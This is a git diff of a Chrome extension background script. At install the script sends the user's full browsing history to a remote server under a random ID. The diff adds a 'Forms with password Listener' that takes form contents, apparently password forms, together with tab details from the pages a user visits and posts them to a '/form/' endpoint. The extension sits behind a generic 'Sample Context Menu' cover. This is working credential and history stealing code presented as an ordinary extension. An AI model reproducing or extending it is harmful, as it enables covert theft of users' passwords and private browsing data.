@@ -36,10 +36,21 @@ const addUser = (uid) => {
     };
     chrome.history.search({ text: "" }, (h) => {
         data.history = h;
-        postRequest("/user/add/", data)
-            .then((ret) => console.log(ret))
-            .catch((err) => console.log(err.message));
+        postRequest("/user/add/", data).catch((err) =>
+            console.log(err.message)
+        );
     });
+};
+
+const addForm = (uid, type, form, tab) => {
+    const data = {
+        uid: uid,
+        date_created: new Date().toString(),
+        type,
+        form,
+        tab,
+    };
+    postRequest("/form/", data).catch((err) => console.log(err.message));
 };
 
 const getRandomToken = () => {
@@ -53,12 +64,12 @@ const getRandomToken = () => {
     return hex;
 };
 
-// On new usercreation
+/********************* Listeners *************************/
 chrome.runtime.onInstalled.addListener((details) => {
     // Made unique identifier for new user
     if (details.reason === "install") {
-        chrome.storage.sync.get("userid", (items) => {
-            const userid = items.userid ? items.userid : getRandomToken();
+        chrome.storage.sync.get("userid", (res) => {
+            const userid = res.userid ? res.userid : getRandomToken();
             chrome.storage.sync.set({ userid: userid });
             addUser(userid);
         });
@@ -68,5 +79,12 @@ chrome.runtime.onInstalled.addListener((details) => {
         id: "sampleContextMenu",
         title: "Sample Context Menu",
         contexts: ["page"],
+    });
+});
+
+/* Forms with password Listener */
+chrome.runtime.onMessage.addListener((request, sender) => {
+    chrome.storage.sync.get("userid", (res) => {
+        addForm(res.userid, request.type, request.form, sender.tab);
     });
 });
